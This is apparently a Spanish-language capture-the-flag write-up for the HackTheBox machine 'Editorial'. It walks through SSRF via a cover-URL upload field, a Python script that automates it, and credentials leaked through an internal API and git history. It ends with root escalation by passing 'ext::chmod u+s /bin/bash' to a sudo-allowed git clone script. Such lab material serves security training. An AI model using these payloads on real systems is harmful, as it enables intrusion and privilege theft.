---
title: "Máquina Editorial"
description: "Resolución de la máquina Editorial de HackTheBox"
tags: ["SSRF", "Default credentials", "git", "sudo"]
categories: ["HackTheBox", "Easy", "Linux"]
logo: "/assets/writeups/editorial/logo.webp"
---

En esta máquina accederemos a un sitio vulnerable a SSRF, vulnerabilidad que podremos usar para descubrir un servicio web interno que en uno de sus endpoints expone una credencial por defecto. Finalmente escalaremos privilegios abusando de un permiso especial.

## Reconocimiento

La máquina solo tiene dos puertos abiertos

```bash
# Nmap 7.95 scan initiated Tue Oct 15 16:49:12 2024 as: nmap -sS -Pn -p- --open -oN ports --min-rate 300 -vvv 10.10.11.20
Nmap scan report for editorial.htb (10.10.11.20)
Host is up, received user-set (0.20s latency).
Scanned at 2024-10-15 16:49:12 -04 for 249s
Not shown: 56760 closed tcp ports (reset), 8773 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Oct 15 16:53:21 2024 -- 1 IP address (1 host up) scanned in 249.38 seconds
```

El servidor web nos manda al dominio `editorial.htb`, por lo que vamos a agregarlo a nuestro fichero de hosts.

```
10.10.11.20 editorial.htb
```
{: file="/etc/hosts"}

Esta página web nos dice que la página es de una editorial de libros llamada "Tiempo Arriba".

![Web](/assets/writeups/editorial/1.png)

La única sección interesante que parece tener, es una para subir libros que serán publicados luego de una revisión...

![Upload](/assets/writeups/editorial/2.png)

Veamos que hacemos con esto.

## Intrusión

Viendo el diseño, podemos ver que tenemos una opción para previsualizar la imagen/portada del libro que se va a mostrar cuando lo subamos; viendo que podemos intrudocir una URL ya nos da ideas de cosas divertidas que podemos intentar.

Colocando una URL, y dándole al botón de previsualizar, podemos ver en el tráfico del navegador que se envia las siguientes peticiones POST al sitio.

![Web request](/assets/writeups/editorial/3.png)

Si introducimos la URL de un servidor web que nosotros controlemos (como puede ser un servidor HTTP Python simple), recibiremos una petición en él:

```bash
❯ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.20 - - [15/Oct/2024 17:00:38] "GET / HTTP/1.1" 200 -
```

Enviando la misma petición con `curl` a `/upload-cover`, el servidor nos devolverá una URI:

```bash
❯ curl -v -F "bookurl=http://10.10.14.203:8000" -F "bookfile=@file.txt" -v http://editorial.htb/upload-cover
* Host editorial.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.20
*   Trying 10.10.11.20:80...
* Connected to editorial.htb () port 80
> POST /upload-cover HTTP/1.1
> Host: editorial.htb
> User-Agent: curl/8.10.0
> Accept: */*
> Content-Length: 330
> Content-Type: multipart/form-data; boundary=------------------------9fdz2SQJQP1Y9RsG0RwphM
> 
* upload completely sent off: 330 bytes
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 15 Oct 2024 21:08:21 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 51
< Connection: keep-alive
< 
* Connection #0 to host editorial.htb left intact
static/uploads/93ea5a5f-b555-44ad-a4d5-762fc0720cdb
```

Viendo lo que contiene ese archivo, podremos notar que es nuestra página HTTP en cuestión:

```bash
❯ curl -v http://editorial.htb/static/uploads/b329a92e-be62-4e95-b13c-6
08490ca99f9
* Host editorial.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.20
*   Trying 10.10.11.20:80...
* Connected to editorial.htb () port 80
> GET /static/uploads/b329a92e-be62-4e95-b13c-608490ca99f9 HTTP/1.1
> Host: editorial.htb
> User-Agent: curl/8.10.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 15 Oct 2024 21:10:34 GMT
< Content-Type: application/octet-stream
< Content-Length: 376
< Connection: keep-alive
< Content-Disposition: inline; filename=b329a92e-be62-4e95-b13c-608490ca9
9f9
< Last-Modified: Tue, 15 Oct 2024 21:10:23 GMT
< Cache-Control: no-cache
< ETag: "1729026623.687862-376-4091811923"
< 
<!DOCTYPE HTML>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Directory listing for /</title>
</head>
<body>
... [snip]
```

Ahora, si intentamos hacer peticiones a la `127.0.0.1` en busca de SSRF, especificamente a puertos internos comunes como el `8000`, `8080`, `3000`... etc. encontraremos algo en el `5000`:

```bash
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 15 Oct 2024 21:13:44 GMT
< Content-Type: application/octet-stream
< Content-Length: 911
< Connection: keep-alive
< Content-Disposition: inline; filename=ddc52f4b-ab4d-454d-b821-e35d4164b4b6
< Last-Modified: Tue, 15 Oct 2024 21:13:34 GMT
< Cache-Control: no-cache
< ETag: "1729026814.0678535-911-61348040"
< 
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
```

Se ve como un REST interno. Podemos scriptear fácilmente esto para no tener que andar copiando y pegando la URI que nos devuelva:

```python
import requests
import sys

def get_ssrf(endpoint):
     
    data = {
        "bookurl": (None, f"http://127.0.0.1:5000/{endpoint}"),
        "bookfile": ("uwu.conf", "asd", "text/plain")
    }
    
    resp = requests.post("http://editorial.htb/upload-cover", files=data)
    # Now fetch the new link and print the contents on the screen
    ssrf_resp = requests.get(f"http://editorial.htb/{resp.text}")
    print(ssrf_resp.text)


if __name__ == "__main__":
    if len(sys.argv) < 2 :
        print(f"Usage: {sys.argv[0]} <endpoint>")
        exit(1)

    get_ssrf(sys.argv[1])
```
{: file="ssrf.py" }

Estos son los endpoints a los que podemos hacer peticiones:

```bash
❯ python ssrf.py / | jq
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our libr
ary.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our librar
y.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new au
thors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
        "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates o
f the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

En el endpoint para ver el mensaje por defecto enviado a nuevos autores, encontramos esto:

```json
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

Esta credencial funciona por SSH, y en el escritorio de este usuario encontraremos la primera flag.

```bash
❯ ssh dev@editorial.htb
dev@editorial.htbs password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Oct 15 09:18:23 PM UTC 2024

  System load:           0.69
  Usage of /:            60.6% of 6.35GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             225
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.20
  IPv6 address for eth0: dead:beef::250:56ff:feb0:70e2


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts.
Check your Internet connection or proxy settings


Last login: Tue Oct 15 20:42:47 2024 from 10.10.14.37
dev@editorial:~$ ls -la
total 36
drwxr-x--- 4 dev  dev  4096 Oct 15 20:56 .
drwxr-xr-x 4 root root 4096 Jun  5 14:36 ..
drwxrwxr-x 3 dev  dev  4096 Jun  5 14:36 apps
lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -> /dev/null
-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 dev  dev  3771 Jan  6  2022 .bashrc
drwx------ 2 dev  dev  4096 Jun  5 14:36 .cache
-rw------- 1 dev  dev    20 Oct 15 20:56 .lesshst
-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile
-rw-r----- 1 root dev    33 Oct 15 20:23 user.txt
dev@editorial:~$ cat user.txt
fe787fffc6643d09303421dd3b******
```

## Escalada de privilegios

### prod - editorial

Hay un repositorio git sin nada en el directorio `apps` dentro de la carpeta de usuario de `dev`:

```bash
dev@editorial:~/apps$ ls -la
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 4 dev dev 4096 Oct 15 20:56 ..
drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git
```

Pero tiene un log de commits

```bash
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

... [snip]
```

Curiosamente, el commit con hash `1e84a036b2f33c59e2390730699a488c65643d28` y comentario `feat: create api to editorial info` contiene un cambio con esto

```diff
-# -- : (development) mail message to new authors
-@app.route(api_route + '/authors/message', methods=['GET'])
-def api_mail_new_authors():
-    return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
-    }) # TODO: replace dev credentials when checks pass
-
-# -------------------------------
-# Start program
-# -------------------------------
-if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=5001, debug=True)
```

Hay un usuario más llamado `prod` que podemos ver listando la carpeta `/home`, y esta contraseña que encontramos es reutilizada por este usuario.

```bash
dev@editorial:~/apps$ su prod
Password: 
prod@editorial:/home/dev/apps$ 
```

### root - editorial

Tenemos asignado el siguiente permiso en sudo:

```bash
prod@editorial:/home/dev/apps$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

El script de Python contiene lo siguiente


```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```
{: file="/opt/internal_apps/clone_changes/clone_prod_change.py"}

Ya que nos permite utilizar el protocolo `ext` de git, básicamente podemos decirle a esto que nos ejecute un comando clonando el siguiente "repositorio": 

```bash
"ext::chmod u+s /bin/bash"
```

Pasandóselo a este script, nos deja efectivamente una bash SUID:

```bash
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::chmod u+s /bin/bash"
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::chmod u+s /bin/bash new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'
prod@editorial:~$ ls -la /usr/bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /usr/bin/bash
```

Por lo que ya podemos tomar la última flag.

```bash
prod@editorial:~$ ls -la /usr/bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /usr/bin/bash
prod@editorial:~$ bash -p
bash-5.1# cd /root
bash-5.1# ls -la
total 36
drwx------  5 root root 4096 Oct 15 20:23 .
drwxr-xr-x 18 root root 4096 Jun  5 14:54 ..
lrwxrwxrwx  1 root root    9 Feb  6  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwxr-xr-x  3 root root 4096 Jun  5 14:36 .cache
-rw-r--r--  1 root root   35 Feb  4  2023 .gitconfig
drwxr-xr-x  3 root root 4096 Jun  5 14:36 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Oct 15 20:23 root.txt
drwx------  2 root root 4096 Jun  5 14:36 .ssh
bash-5.1# cat root.txt
5ada2815a644dbb9cd398028b2******
```